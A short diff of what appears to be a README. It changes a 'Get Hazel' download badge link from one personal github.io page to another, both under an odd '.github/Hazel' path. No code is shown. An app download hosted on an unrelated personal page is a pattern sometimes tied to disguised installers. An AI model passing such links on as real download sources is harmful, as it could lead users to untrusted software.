@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://manhyusuu48.github.io/.github/Hazel">  
+<a href="https://tembilamusion.github.io/.github/Hazel">  
 <img src="https://img.shields.io/badge/⚙️_Get_Hazel-4B8BBE?style=for-the-badge&logo=apple&logoColor=white" alt="Get Hazel">  
 </a>  
 </div>  
